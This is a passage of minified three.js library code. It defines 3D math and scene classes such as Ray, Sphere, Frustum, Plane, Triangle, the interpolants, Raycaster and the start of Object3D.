this}}(),makeFrustum:function(a,b,c,d,e,f){var g=this.elements;g[0]=2*e/(b-a);g[4]=0;g[8]=(b+a)/(b-a);g[12]=0;g[1]=0;g[5]=2*e/(d-c);g[9]=(d+c)/(d-c);g[13]=0;g[2]=0;g[6]=0;g[10]=-(f+e)/(f-e);g[14]=-2*f*e/(f-e);g[3]=0;g[7]=0;g[11]=-1;g[15]=0;return this},makePerspective:function(a,b,c,d){a=c*Math.tan(THREE.Math.DEG2RAD*a*.5);var e=\n-a;return this.makeFrustum(e*b,a*b,e,a,c,d)},makeOrthographic:function(a,b,c,d,e,f){var g=this.elements,h=1/(b-a),k=1/(c-d),l=1/(f-e);g[0]=2*h;g[4]=0;g[8]=0;g[12]=-((b+a)*h);g[1]=0;g[5]=2*k;g[9]=0;g[13]=-((c+d)*k);g[2]=0;g[6]=0;g[10]=-2*l;g[14]=-((f+e)*l);g[3]=0;g[7]=0;g[11]=0;g[15]=1;return this},equals:function(a){var b=this.elements;a=a.elements;for(var c=0;16>c;c++)if(b[c]!==a[c])return!1;return!0},fromArray:function(a){this.elements.set(a);return this},toArray:function(a,b){void 0===a&&(a=[]);\nvoid 0===b&&(b=0);var c=this.elements;a[b]=c[0];a[b+1]=c[1];a[b+2]=c[2];a[b+3]=c[3];a[b+4]=c[4];a[b+5]=c[5];a[b+6]=c[6];a[b+7]=c[7];a[b+8]=c[8];a[b+9]=c[9];a[b+10]=c[10];a[b+11]=c[11];a[b+12]=c[12];a[b+13]=c[13];a[b+14]=c[14];a[b+15]=c[15];return a}};THREE.Ray=function(a,b){this.origin=void 0!==a?a:new THREE.Vector3;this.direction=void 0!==b?b:new THREE.Vector3};\nTHREE.Ray.prototype={constructor:THREE.Ray,set:function(a,b){this.origin.copy(a);this.direction.copy(b);return this},clone:function(){return(new this.constructor).copy(this)},copy:function(a){this.origin.copy(a.origin);this.direction.copy(a.direction);return this},at:function(a,b){return(b||new THREE.Vector3).copy(this.direction).multiplyScalar(a).add(this.origin)},lookAt:function(a){this.direction.copy(a).sub(this.origin).normalize();return this},recast:function(){var a=new THREE.Vector3;return function(b){this.origin.copy(this.at(b,\na));return this}}(),closestPointToPoint:function(a,b){var c=b||new THREE.Vector3;c.subVectors(a,this.origin);var d=c.dot(this.direction);return 0>d?c.copy(this.origin):c.copy(this.direction).multiplyScalar(d).add(this.origin)},distanceToPoint:function(a){return Math.sqrt(this.distanceSqToPoint(a))},distanceSqToPoint:function(){var a=new THREE.Vector3;return function(b){var c=a.subVectors(b,this.origin).dot(this.direction);if(0>c)return this.origin.distanceToSquared(b);a.copy(this.direction).multiplyScalar(c).add(this.origin);\nreturn a.distanceToSquared(b)}}(),distanceSqToSegment:function(){var a=new THREE.Vector3,b=new THREE.Vector3,c=new THREE.Vector3;return function(d,e,f,g){a.copy(d).add(e).multiplyScalar(.5);b.copy(e).sub(d).normalize();c.copy(this.origin).sub(a);var h=.5*d.distanceTo(e),k=-this.direction.dot(b),l=c.dot(this.direction),n=-c.dot(b),p=c.lengthSq(),m=Math.abs(1-k*k),q;0<m?(d=k*n-l,e=k*l-n,q=h*m,0<=d?e>=-q?e<=q?(h=1/m,d*=h,e*=h,k=d*(d+k*e+2*l)+e*(k*d+e+2*n)+p):(e=h,d=Math.max(0,-(k*e+l)),k=-d*d+e*(e+2*\nn)+p):(e=-h,d=Math.max(0,-(k*e+l)),k=-d*d+e*(e+2*n)+p):e<=-q?(d=Math.max(0,-(-k*h+l)),e=0<d?-h:Math.min(Math.max(-h,-n),h),k=-d*d+e*(e+2*n)+p):e<=q?(d=0,e=Math.min(Math.max(-h,-n),h),k=e*(e+2*n)+p):(d=Math.max(0,-(k*h+l)),e=0<d?h:Math.min(Math.max(-h,-n),h),k=-d*d+e*(e+2*n)+p)):(e=0<k?-h:h,d=Math.max(0,-(k*e+l)),k=-d*d+e*(e+2*n)+p);f&&f.copy(this.direction).multiplyScalar(d).add(this.origin);g&&g.copy(b).multiplyScalar(e).add(a);return k}}(),intersectSphere:function(){var a=new THREE.Vector3;return function(b,\nc){a.subVectors(b.center,this.origin);var d=a.dot(this.direction),e=a.dot(a)-d*d,f=b.radius*b.radius;if(e>f)return null;f=Math.sqrt(f-e);e=d-f;d+=f;return 0>e&&0>d?null:0>e?this.at(d,c):this.at(e,c)}}(),intersectsSphere:function(a){return this.distanceToPoint(a.center)<=a.radius},distanceToPlane:function(a){var b=a.normal.dot(this.direction);if(0===b)return 0===a.distanceToPoint(this.origin)?0:null;a=-(this.origin.dot(a.normal)+a.constant)/b;return 0<=a?a:null},intersectPlane:function(a,b){var c=\nthis.distanceToPlane(a);return null===c?null:this.at(c,b)},intersectsPlane:function(a){var b=a.distanceToPoint(this.origin);return 0===b||0>a.normal.dot(this.direction)*b?!0:!1},intersectBox:function(a,b){var c,d,e,f,g;d=1/this.direction.x;f=1/this.direction.y;g=1/this.direction.z;var h=this.origin;0<=d?(c=(a.min.x-h.x)*d,d*=a.max.x-h.x):(c=(a.max.x-h.x)*d,d*=a.min.x-h.x);0<=f?(e=(a.min.y-h.y)*f,f*=a.max.y-h.y):(e=(a.max.y-h.y)*f,f*=a.min.y-h.y);if(c>f||e>d)return null;if(e>c||c!==c)c=e;if(f<d||d!==\nd)d=f;0<=g?(e=(a.min.z-h.z)*g,g*=a.max.z-h.z):(e=(a.max.z-h.z)*g,g*=a.min.z-h.z);if(c>g||e>d)return null;if(e>c||c!==c)c=e;if(g<d||d!==d)d=g;return 0>d?null:this.at(0<=c?c:d,b)},intersectsBox:function(){var a=new THREE.Vector3;return function(b){return null!==this.intersectBox(b,a)}}(),intersectTriangle:function(){var a=new THREE.Vector3,b=new THREE.Vector3,c=new THREE.Vector3,d=new THREE.Vector3;return function(e,f,g,h,k){b.subVectors(f,e);c.subVectors(g,e);d.crossVectors(b,c);f=this.direction.dot(d);\nif(0<f){if(h)return null;h=1}else if(0>f)h=-1,f=-f;else return null;a.subVectors(this.origin,e);e=h*this.direction.dot(c.crossVectors(a,c));if(0>e)return null;g=h*this.direction.dot(b.cross(a));if(0>g||e+g>f)return null;e=-h*a.dot(d);return 0>e?null:this.at(e/f,k)}}(),applyMatrix4:function(a){this.direction.add(this.origin).applyMatrix4(a);this.origin.applyMatrix4(a);this.direction.sub(this.origin);this.direction.normalize();return this},equals:function(a){return a.origin.equals(this.origin)&&a.direction.equals(this.direction)}};\nTHREE.Sphere=function(a,b){this.center=void 0!==a?a:new THREE.Vector3;this.radius=void 0!==b?b:0};\nTHREE.Sphere.prototype={constructor:THREE.Sphere,set:function(a,b){this.center.copy(a);this.radius=b;return this},setFromPoints:function(){var a=new THREE.Box3;return function(b,c){var d=this.center;void 0!==c?d.copy(c):a.setFromPoints(b).center(d);for(var e=0,f=0,g=b.length;f<g;f++)e=Math.max(e,d.distanceToSquared(b[f]));this.radius=Math.sqrt(e);return this}}(),clone:function(){return(new this.constructor).copy(this)},copy:function(a){this.center.copy(a.center);this.radius=a.radius;return this},\nempty:function(){return 0>=this.radius},containsPoint:function(a){return a.distanceToSquared(this.center)<=this.radius*this.radius},distanceToPoint:function(a){return a.distanceTo(this.center)-this.radius},intersectsSphere:function(a){var b=this.radius+a.radius;return a.center.distanceToSquared(this.center)<=b*b},intersectsBox:function(a){return a.intersectsSphere(this)},intersectsPlane:function(a){return Math.abs(this.center.dot(a.normal)-a.constant)<=this.radius},clampPoint:function(a,b){var c=\nthis.center.distanceToSquared(a),d=b||new THREE.Vector3;d.copy(a);c>this.radius*this.radius&&(d.sub(this.center).normalize(),d.multiplyScalar(this.radius).add(this.center));return d},getBoundingBox:function(a){a=a||new THREE.Box3;a.set(this.center,this.center);a.expandByScalar(this.radius);return a},applyMatrix4:function(a){this.center.applyMatrix4(a);this.radius*=a.getMaxScaleOnAxis();return this},translate:function(a){this.center.add(a);return this},equals:function(a){return a.center.equals(this.center)&&\na.radius===this.radius}};THREE.Frustum=function(a,b,c,d,e,f){this.planes=[void 0!==a?a:new THREE.Plane,void 0!==b?b:new THREE.Plane,void 0!==c?c:new THREE.Plane,void 0!==d?d:new THREE.Plane,void 0!==e?e:new THREE.Plane,void 0!==f?f:new THREE.Plane]};\nTHREE.Frustum.prototype={constructor:THREE.Frustum,set:function(a,b,c,d,e,f){var g=this.planes;g[0].copy(a);g[1].copy(b);g[2].copy(c);g[3].copy(d);g[4].copy(e);g[5].copy(f);return this},clone:function(){return(new this.constructor).copy(this)},copy:function(a){for(var b=this.planes,c=0;6>c;c++)b[c].copy(a.planes[c]);return this},setFromMatrix:function(a){var b=this.planes,c=a.elements;a=c[0];var d=c[1],e=c[2],f=c[3],g=c[4],h=c[5],k=c[6],l=c[7],n=c[8],p=c[9],m=c[10],q=c[11],r=c[12],s=c[13],t=c[14],\nc=c[15];b[0].setComponents(f-a,l-g,q-n,c-r).normalize();b[1].setComponents(f+a,l+g,q+n,c+r).normalize();b[2].setComponents(f+d,l+h,q+p,c+s).normalize();b[3].setComponents(f-d,l-h,q-p,c-s).normalize();b[4].setComponents(f-e,l-k,q-m,c-t).normalize();b[5].setComponents(f+e,l+k,q+m,c+t).normalize();return this},intersectsObject:function(){var a=new THREE.Sphere;return function(b){var c=b.geometry;null===c.boundingSphere&&c.computeBoundingSphere();a.copy(c.boundingSphere).applyMatrix4(b.matrixWorld);return this.intersectsSphere(a)}}(),\nintersectsSprite:function(){var a=new THREE.Sphere;return function(b){a.center.set(0,0,0);a.radius=.7071067811865476;a.applyMatrix4(b.matrixWorld);return this.intersectsSphere(a)}}(),intersectsSphere:function(a){var b=this.planes,c=a.center;a=-a.radius;for(var d=0;6>d;d++)if(b[d].distanceToPoint(c)<a)return!1;return!0},intersectsBox:function(){var a=new THREE.Vector3,b=new THREE.Vector3;return function(c){for(var d=this.planes,e=0;6>e;e++){var f=d[e];a.x=0<f.normal.x?c.min.x:c.max.x;b.x=0<f.normal.x?\nc.max.x:c.min.x;a.y=0<f.normal.y?c.min.y:c.max.y;b.y=0<f.normal.y?c.max.y:c.min.y;a.z=0<f.normal.z?c.min.z:c.max.z;b.z=0<f.normal.z?c.max.z:c.min.z;var g=f.distanceToPoint(a),f=f.distanceToPoint(b);if(0>g&&0>f)return!1}return!0}}(),containsPoint:function(a){for(var b=this.planes,c=0;6>c;c++)if(0>b[c].distanceToPoint(a))return!1;return!0}};THREE.Plane=function(a,b){this.normal=void 0!==a?a:new THREE.Vector3(1,0,0);this.constant=void 0!==b?b:0};\nTHREE.Plane.prototype={constructor:THREE.Plane,set:function(a,b){this.normal.copy(a);this.constant=b;return this},setComponents:function(a,b,c,d){this.normal.set(a,b,c);this.constant=d;return this},setFromNormalAndCoplanarPoint:function(a,b){this.normal.copy(a);this.constant=-b.dot(this.normal);return this},setFromCoplanarPoints:function(){var a=new THREE.Vector3,b=new THREE.Vector3;return function(c,d,e){d=a.subVectors(e,d).cross(b.subVectors(c,d)).normalize();this.setFromNormalAndCoplanarPoint(d,\nc);return this}}(),clone:function(){return(new this.constructor).copy(this)},copy:function(a){this.normal.copy(a.normal);this.constant=a.constant;return this},normalize:function(){var a=1/this.normal.length();this.normal.multiplyScalar(a);this.constant*=a;return this},negate:function(){this.constant*=-1;this.normal.negate();return this},distanceToPoint:function(a){return this.normal.dot(a)+this.constant},distanceToSphere:function(a){return this.distanceToPoint(a.center)-a.radius},projectPoint:function(a,\nb){return this.orthoPoint(a,b).sub(a).negate()},orthoPoint:function(a,b){var c=this.distanceToPoint(a);return(b||new THREE.Vector3).copy(this.normal).multiplyScalar(c)},intersectLine:function(){var a=new THREE.Vector3;return function(b,c){var d=c||new THREE.Vector3,e=b.delta(a),f=this.normal.dot(e);if(0===f){if(0===this.distanceToPoint(b.start))return d.copy(b.start)}else return f=-(b.start.dot(this.normal)+this.constant)/f,0>f||1<f?void 0:d.copy(e).multiplyScalar(f).add(b.start)}}(),intersectsLine:function(a){var b=\nthis.distanceToPoint(a.start);a=this.distanceToPoint(a.end);return 0>b&&0<a||0>a&&0<b},intersectsBox:function(a){return a.intersectsPlane(this)},intersectsSphere:function(a){return a.intersectsPlane(this)},coplanarPoint:function(a){return(a||new THREE.Vector3).copy(this.normal).multiplyScalar(-this.constant)},applyMatrix4:function(){var a=new THREE.Vector3,b=new THREE.Matrix3;return function(c,d){var e=this.coplanarPoint(a).applyMatrix4(c),f=d||b.getNormalMatrix(c),f=this.normal.applyMatrix3(f).normalize();\nthis.constant=-e.dot(f);return this}}(),translate:function(a){this.constant-=a.dot(this.normal);return this},equals:function(a){return a.normal.equals(this.normal)&&a.constant===this.constant}};THREE.Spherical=function(a,b,c){this.radius=void 0!==a?a:1;this.phi=void 0!==b?b:0;this.theta=void 0!==c?c:0;return this};\nTHREE.Spherical.prototype={constructor:THREE.Spherical,set:function(a,b,c){this.radius=a;this.phi=b;this.theta=c;return this},clone:function(){return(new this.constructor).copy(this)},copy:function(a){this.radius.copy(a.radius);this.phi.copy(a.phi);this.theta.copy(a.theta);return this},makeSafe:function(){this.phi=Math.max(1E-6,Math.min(Math.PI-1E-6,this.phi));return this},setFromVector3:function(a){this.radius=a.length();0===this.radius?this.phi=this.theta=0:(this.theta=Math.atan2(a.x,a.z),this.phi=\nMath.acos(THREE.Math.clamp(a.y/this.radius,-1,1)));return this}};\nTHREE.Math={DEG2RAD:Math.PI/180,RAD2DEG:180/Math.PI,generateUUID:function(){var a=\"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\".split(\"\"),b=Array(36),c=0,d;return function(){for(var e=0;36>e;e++)8===e||13===e||18===e||23===e?b[e]=\"-\":14===e?b[e]=\"4\":(2>=c&&(c=33554432+16777216*Math.random()|0),d=c&15,c>>=4,b[e]=a[19===e?d&3|8:d]);return b.join(\"\")}}(),clamp:function(a,b,c){return Math.max(b,Math.min(c,a))},euclideanModulo:function(a,b){return(a%b+b)%b},mapLinear:function(a,b,c,\nd,e){return d+(a-b)*(e-d)/(c-b)},smoothstep:function(a,b,c){if(a<=b)return 0;if(a>=c)return 1;a=(a-b)/(c-b);return a*a*(3-2*a)},smootherstep:function(a,b,c){if(a<=b)return 0;if(a>=c)return 1;a=(a-b)/(c-b);return a*a*a*(a*(6*a-15)+10)},random16:function(){console.warn(\"THREE.Math.random16() has been deprecated. Use Math.random() instead.\");return Math.random()},randInt:function(a,b){return a+Math.floor(Math.random()*(b-a+1))},randFloat:function(a,b){return a+Math.random()*(b-a)},randFloatSpread:function(a){return a*\n(.5-Math.random())},degToRad:function(a){return a*THREE.Math.DEG2RAD},radToDeg:function(a){return a*THREE.Math.RAD2DEG},isPowerOfTwo:function(a){return 0===(a&a-1)&&0!==a},nearestPowerOfTwo:function(a){return Math.pow(2,Math.round(Math.log(a)/Math.LN2))},nextPowerOfTwo:function(a){a--;a|=a>>1;a|=a>>2;a|=a>>4;a|=a>>8;a|=a>>16;a++;return a}};\nTHREE.Spline=function(a){function b(a,b,c,d,e,f,g){a=.5*(c-a);d=.5*(d-b);return(2*(b-c)+a+d)*g+(-3*(b-c)-2*a-d)*f+a*e+b}this.points=a;var c=[],d={x:0,y:0,z:0},e,f,g,h,k,l,n,p,m;this.initFromArray=function(a){this.points=[];for(var b=0;b<a.length;b++)this.points[b]={x:a[b][0],y:a[b][1],z:a[b][2]}};this.getPoint=function(a){e=(this.points.length-1)*a;f=Math.floor(e);g=e-f;c[0]=0===f?f:f-1;c[1]=f;c[2]=f>this.points.length-2?this.points.length-1:f+1;c[3]=f>this.points.length-3?this.points.length-1:f+\n2;l=this.points[c[0]];n=this.points[c[1]];p=this.points[c[2]];m=this.points[c[3]];h=g*g;k=g*h;d.x=b(l.x,n.x,p.x,m.x,g,h,k);d.y=b(l.y,n.y,p.y,m.y,g,h,k);d.z=b(l.z,n.z,p.z,m.z,g,h,k);return d};this.getControlPointsArray=function(){var a,b,c=this.points.length,d=[];for(a=0;a<c;a++)b=this.points[a],d[a]=[b.x,b.y,b.z];return d};this.getLength=function(a){var b,c,d,e=b=b=0,f=new THREE.Vector3,g=new THREE.Vector3,h=[],k=0;h[0]=0;a||(a=100);c=this.points.length*a;f.copy(this.points[0]);for(a=1;a<c;a++)b=\na/c,d=this.getPoint(b),g.copy(d),k+=g.distanceTo(f),f.copy(d),b*=this.points.length-1,b=Math.floor(b),b!==e&&(h[b]=k,e=b);h[h.length]=k;return{chunks:h,total:k}};this.reparametrizeByArcLength=function(a){var b,c,d,e,f,g,h=[],k=new THREE.Vector3,m=this.getLength();h.push(k.copy(this.points[0]).clone());for(b=1;b<this.points.length;b++){c=m.chunks[b]-m.chunks[b-1];g=Math.ceil(a*c/m.total);e=(b-1)/(this.points.length-1);f=b/(this.points.length-1);for(c=1;c<g-1;c++)d=e+1/g*c*(f-e),d=this.getPoint(d),\nh.push(k.copy(d).clone());h.push(k.copy(this.points[b]).clone())}this.points=h}};THREE.Triangle=function(a,b,c){this.a=void 0!==a?a:new THREE.Vector3;this.b=void 0!==b?b:new THREE.Vector3;this.c=void 0!==c?c:new THREE.Vector3};THREE.Triangle.normal=function(){var a=new THREE.Vector3;return function(b,c,d,e){e=e||new THREE.Vector3;e.subVectors(d,c);a.subVectors(b,c);e.cross(a);b=e.lengthSq();return 0<b?e.multiplyScalar(1/Math.sqrt(b)):e.set(0,0,0)}}();\nTHREE.Triangle.barycoordFromPoint=function(){var a=new THREE.Vector3,b=new THREE.Vector3,c=new THREE.Vector3;return function(d,e,f,g,h){a.subVectors(g,e);b.subVectors(f,e);c.subVectors(d,e);d=a.dot(a);e=a.dot(b);f=a.dot(c);var k=b.dot(b);g=b.dot(c);var l=d*k-e*e;h=h||new THREE.Vector3;if(0===l)return h.set(-2,-1,-1);l=1/l;k=(k*f-e*g)*l;d=(d*g-e*f)*l;return h.set(1-k-d,d,k)}}();\nTHREE.Triangle.containsPoint=function(){var a=new THREE.Vector3;return function(b,c,d,e){b=THREE.Triangle.barycoordFromPoint(b,c,d,e,a);return 0<=b.x&&0<=b.y&&1>=b.x+b.y}}();\nTHREE.Triangle.prototype={constructor:THREE.Triangle,set:function(a,b,c){this.a.copy(a);this.b.copy(b);this.c.copy(c);return this},setFromPointsAndIndices:function(a,b,c,d){this.a.copy(a[b]);this.b.copy(a[c]);this.c.copy(a[d]);return this},clone:function(){return(new this.constructor).copy(this)},copy:function(a){this.a.copy(a.a);this.b.copy(a.b);this.c.copy(a.c);return this},area:function(){var a=new THREE.Vector3,b=new THREE.Vector3;return function(){a.subVectors(this.c,this.b);b.subVectors(this.a,\nthis.b);return.5*a.cross(b).length()}}(),midpoint:function(a){return(a||new THREE.Vector3).addVectors(this.a,this.b).add(this.c).multiplyScalar(1/3)},normal:function(a){return THREE.Triangle.normal(this.a,this.b,this.c,a)},plane:function(a){return(a||new THREE.Plane).setFromCoplanarPoints(this.a,this.b,this.c)},barycoordFromPoint:function(a,b){return THREE.Triangle.barycoordFromPoint(a,this.a,this.b,this.c,b)},containsPoint:function(a){return THREE.Triangle.containsPoint(a,this.a,this.b,this.c)},\nclosestPointToPoint:function(){var a,b,c,d;return function(e,f){void 0===a&&(a=new THREE.Plane,b=[new THREE.Line3,new THREE.Line3,new THREE.Line3],c=new THREE.Vector3,d=new THREE.Vector3);var g=f||new THREE.Vector3,h=Infinity;a.setFromCoplanarPoints(this.a,this.b,this.c);a.projectPoint(e,c);if(!0===this.containsPoint(c))g.copy(c);else{b[0].set(this.a,this.b);b[1].set(this.b,this.c);b[2].set(this.c,this.a);for(var k=0;k<b.length;k++){b[k].closestPointToPoint(c,!0,d);var l=c.distanceToSquared(d);l<\nh&&(h=l,g.copy(d))}}return g}}(),equals:function(a){return a.a.equals(this.a)&&a.b.equals(this.b)&&a.c.equals(this.c)}};THREE.Interpolant=function(a,b,c,d){this.parameterPositions=a;this._cachedIndex=0;this.resultBuffer=void 0!==d?d:new b.constructor(c);this.sampleValues=b;this.valueSize=c};\nTHREE.Interpolant.prototype={constructor:THREE.Interpolant,evaluate:function(a){var b=this.parameterPositions,c=this._cachedIndex,d=b[c],e=b[c-1];a:{b:{c:{d:if(!(a<d)){for(var f=c+2;;){if(void 0===d){if(a<e)break d;this._cachedIndex=c=b.length;return this.afterEnd_(c-1,a,e)}if(c===f)break;e=d;d=b[++c];if(a<d)break b}d=b.length;break c}if(a>=e)break a;else{f=b[1];a<f&&(c=2,e=f);for(f=c-2;;){if(void 0===e)return this._cachedIndex=0,this.beforeStart_(0,a,d);if(c===f)break;d=e;e=b[--c-1];if(a>=e)break b}d=\nc;c=0}}for(;c<d;)e=c+d>>>1,a<b[e]?d=e:c=e+1;d=b[c];e=b[c-1];if(void 0===e)return this._cachedIndex=0,this.beforeStart_(0,a,d);if(void 0===d)return this._cachedIndex=c=b.length,this.afterEnd_(c-1,e,a)}this._cachedIndex=c;this.intervalChanged_(c,e,d)}return this.interpolate_(c,e,a,d)},settings:null,DefaultSettings_:{},getSettings_:function(){return this.settings||this.DefaultSettings_},copySampleValue_:function(a){var b=this.resultBuffer,c=this.sampleValues,d=this.valueSize;a*=d;for(var e=0;e!==d;++e)b[e]=\nc[a+e];return b},interpolate_:function(a,b,c,d){throw Error(\"call to abstract method\");},intervalChanged_:function(a,b,c){}};Object.assign(THREE.Interpolant.prototype,{beforeStart_:THREE.Interpolant.prototype.copySampleValue_,afterEnd_:THREE.Interpolant.prototype.copySampleValue_});THREE.CubicInterpolant=function(a,b,c,d){THREE.Interpolant.call(this,a,b,c,d);this._offsetNext=this._weightNext=this._offsetPrev=this._weightPrev=-0};\nTHREE.CubicInterpolant.prototype=Object.assign(Object.create(THREE.Interpolant.prototype),{constructor:THREE.CubicInterpolant,DefaultSettings_:{endingStart:THREE.ZeroCurvatureEnding,endingEnd:THREE.ZeroCurvatureEnding},intervalChanged_:function(a,b,c){var d=this.parameterPositions,e=a-2,f=a+1,g=d[e],h=d[f];if(void 0===g)switch(this.getSettings_().endingStart){case THREE.ZeroSlopeEnding:e=a;g=2*b-c;break;case THREE.WrapAroundEnding:e=d.length-2;g=b+d[e]-d[e+1];break;default:e=a,g=c}if(void 0===h)switch(this.getSettings_().endingEnd){case THREE.ZeroSlopeEnding:f=\na;h=2*c-b;break;case THREE.WrapAroundEnding:f=1;h=c+d[1]-d[0];break;default:f=a-1,h=b}a=.5*(c-b);d=this.valueSize;this._weightPrev=a/(b-g);this._weightNext=a/(h-c);this._offsetPrev=e*d;this._offsetNext=f*d},interpolate_:function(a,b,c,d){var e=this.resultBuffer,f=this.sampleValues,g=this.valueSize;a*=g;var h=a-g,k=this._offsetPrev,l=this._offsetNext,n=this._weightPrev,p=this._weightNext,m=(c-b)/(d-b);c=m*m;d=c*m;b=-n*d+2*n*c-n*m;n=(1+n)*d+(-1.5-2*n)*c+(-.5+n)*m+1;m=(-1-p)*d+(1.5+p)*c+.5*m;p=p*d-p*\nc;for(c=0;c!==g;++c)e[c]=b*f[k+c]+n*f[h+c]+m*f[a+c]+p*f[l+c];return e}});THREE.DiscreteInterpolant=function(a,b,c,d){THREE.Interpolant.call(this,a,b,c,d)};THREE.DiscreteInterpolant.prototype=Object.assign(Object.create(THREE.Interpolant.prototype),{constructor:THREE.DiscreteInterpolant,interpolate_:function(a,b,c,d){return this.copySampleValue_(a-1)}});THREE.LinearInterpolant=function(a,b,c,d){THREE.Interpolant.call(this,a,b,c,d)};\nTHREE.LinearInterpolant.prototype=Object.assign(Object.create(THREE.Interpolant.prototype),{constructor:THREE.LinearInterpolant,interpolate_:function(a,b,c,d){var e=this.resultBuffer,f=this.sampleValues,g=this.valueSize;a*=g;var h=a-g;b=(c-b)/(d-b);c=1-b;for(d=0;d!==g;++d)e[d]=f[h+d]*c+f[a+d]*b;return e}});THREE.QuaternionLinearInterpolant=function(a,b,c,d){THREE.Interpolant.call(this,a,b,c,d)};\nTHREE.QuaternionLinearInterpolant.prototype=Object.assign(Object.create(THREE.Interpolant.prototype),{constructor:THREE.QuaternionLinearInterpolant,interpolate_:function(a,b,c,d){var e=this.resultBuffer,f=this.sampleValues,g=this.valueSize;a*=g;b=(c-b)/(d-b);for(c=a+g;a!==c;a+=4)THREE.Quaternion.slerpFlat(e,0,f,a-g,f,a,b);return e}});THREE.Clock=function(a){this.autoStart=void 0!==a?a:!0;this.elapsedTime=this.oldTime=this.startTime=0;this.running=!1};\nTHREE.Clock.prototype={constructor:THREE.Clock,start:function(){this.oldTime=this.startTime=(performance||Date).now();this.running=!0},stop:function(){this.getElapsedTime();this.running=!1},getElapsedTime:function(){this.getDelta();return this.elapsedTime},getDelta:function(){var a=0;this.autoStart&&!this.running&&this.start();if(this.running){var b=(performance||Date).now(),a=(b-this.oldTime)/1E3;this.oldTime=b;this.elapsedTime+=a}return a}};THREE.EventDispatcher=function(){};\nObject.assign(THREE.EventDispatcher.prototype,{addEventListener:function(a,b){void 0===this._listeners&&(this._listeners={});var c=this._listeners;void 0===c[a]&&(c[a]=[]);-1===c[a].indexOf(b)&&c[a].push(b)},hasEventListener:function(a,b){if(void 0===this._listeners)return!1;var c=this._listeners;return void 0!==c[a]&&-1!==c[a].indexOf(b)?!0:!1},removeEventListener:function(a,b){if(void 0!==this._listeners){var c=this._listeners[a];if(void 0!==c){var d=c.indexOf(b);-1!==d&&c.splice(d,1)}}},dispatchEvent:function(a){if(void 0!==\nthis._listeners){var b=this._listeners[a.type];if(void 0!==b){a.target=this;for(var c=[],d=0,e=b.length,d=0;d<e;d++)c[d]=b[d];for(d=0;d<e;d++)c[d].call(this,a)}}}});THREE.Layers=function(){this.mask=1};THREE.Layers.prototype={constructor:THREE.Layers,set:function(a){this.mask=1<<a},enable:function(a){this.mask|=1<<a},toggle:function(a){this.mask^=1<<a},disable:function(a){this.mask&=~(1<<a)},test:function(a){return 0!==(this.mask&a.mask)}};\n(function(a){function b(a,b){return a.distance-b.distance}function c(a,b,f,g){if(!1!==a.visible&&(a.raycast(b,f),!0===g)){a=a.children;g=0;for(var h=a.length;g<h;g++)c(a[g],b,f,!0)}}a.Raycaster=function(b,c,f,g){this.ray=new a.Ray(b,c);this.near=f||0;this.far=g||Infinity;this.params={Mesh:{},Line:{},LOD:{},Points:{threshold:1},Sprite:{}};Object.defineProperties(this.params,{PointCloud:{get:function(){console.warn(\"THREE.Raycaster: params.PointCloud has been renamed to params.Points.\");return this.Points}}})};\na.Raycaster.prototype={constructor:a.Raycaster,linePrecision:1,set:function(a,b){this.ray.set(a,b)},setFromCamera:function(b,c){c instanceof a.PerspectiveCamera?(this.ray.origin.setFromMatrixPosition(c.matrixWorld),this.ray.direction.set(b.x,b.y,.5).unproject(c).sub(this.ray.origin).normalize()):c instanceof a.OrthographicCamera?(this.ray.origin.set(b.x,b.y,(c.near+c.far)/(c.near-c.far)).unproject(c),this.ray.direction.set(0,0,-1).transformDirection(c.matrixWorld)):console.error(\"THREE.Raycaster: Unsupported camera type.\")},\nintersectObject:function(a,e){var f=[];c(a,this,f,e);f.sort(b);return f},intersectObjects:function(a,e){var f=[];if(!1===Array.isArray(a))return console.warn(\"THREE.Raycaster.intersectObjects: objects is not an Array.\"),f;for(var g=0,h=a.length;g<h;g++)c(a[g],this,f,e);f.sort(b);return f}}})(THREE);\nTHREE.Object3D=function(){Object.defineProperty(this,\"id\",{value:THREE.Object3DIdCount++});this.uuid=THREE.Math.generateUUID();this.name=\"\";this.type=\"Object3D\";this.parent=null;this.children=[];this.up=THREE.Object3D.DefaultUp.clone();var a=new THREE.Vector3,b=new THREE.Euler,c=new THREE.Quaternion,d=new THREE.Vector3(1,1,1);b.onChange(function(){c.setFromEuler(b,!1)});c.onChange(function(){b.setFromQuaternion(c,void 0,!1)});Object.defineProperties(this,{position:{enumerable:!0,value:a},rotation:{enumerable:!0,\nvalue:b},quaternion:{enumerable:!0,value:c},scale:{enumerable:!0,value:d},modelViewMatrix:{value:new THREE.Matrix4},normalMatrix:{value:new THREE.Matrix3}});this.matrix=new THREE.Matrix4;this.matrixWorld=new THREE.Matrix4;this.matrixAutoUpdate=THREE.Object3D.DefaultMatrixAutoUpdate;this.matrixWorldNeedsUpdate=!1;this.layers=new THREE.Layers;this.visible=!0;this.receiveShadow=this.castShadow=!1;this.frustumCulled=!0;this.renderOrder=0;this.userData={}};\nTHREE.Object3D.DefaultUp=new THREE.Vector3(0,1,0);THREE.Object3D.DefaultMatrixAutoUpdate=!0;\nObject.assign(THREE.Object3D.prototype,THREE.EventDispatcher.prototype,{applyMatrix:function(a){this.matrix.multiplyMatrices(a,this.matrix);this.matrix.decompose(this.position,this.quaternion,this.scale)},setRotationFromAxisAngle:function(a,b){this.quaternion.setFromAxisAngle(a,b)},setRotationFromEuler:function(a){this.quaternion.setFromEuler(a,!0)},setRotationFromMatrix:function(a){this.quaternion.setFromRotationMatrix(a)},setRotationFromQuaternion:function(a){this.quaternion.copy(a)},rotateOnAxis:function(){var a=\nnew THREE.Quaternion;return function(b,c){a.setFromAxisAngle(b,c);this.quaternion.multiply(a);return this}}(),rotateX:function(){var a=new THREE.Vector3(1,0,0);return function(b){return this.rotateOnAxis(a,b)}}(),rotateY:function(){var a=new THREE.Vector3(0,1,0);return function(b){return this.rotateOnAxis(a,b)}}(),rotateZ:function(){var a=new THREE.Vector3(0,0,1);return function(b){return this.rotateOnAxis(a,b)}}(),translateOnAxis:function(){var a=new THREE.Vector3;return function(b,c){a.copy(b).applyQuaternion(this.quaternion);\nthis.position.add(a.multiplyScalar(c));return this}}(),translateX:function(){var a=new THREE.Vector3(1,0,0);return function(b){return this.translateOnAxis(a,b)}}(),translateY:function(){var a=new THREE.Vector3(0,1,0);return function(b){return this.translateOnAxis(a,b)}}(),translateZ:function(){var a=new THREE.Vector3(0,0,1);return function(b){return this.translateOnAxis(a,b)}}(),localToWorld:function(a){return 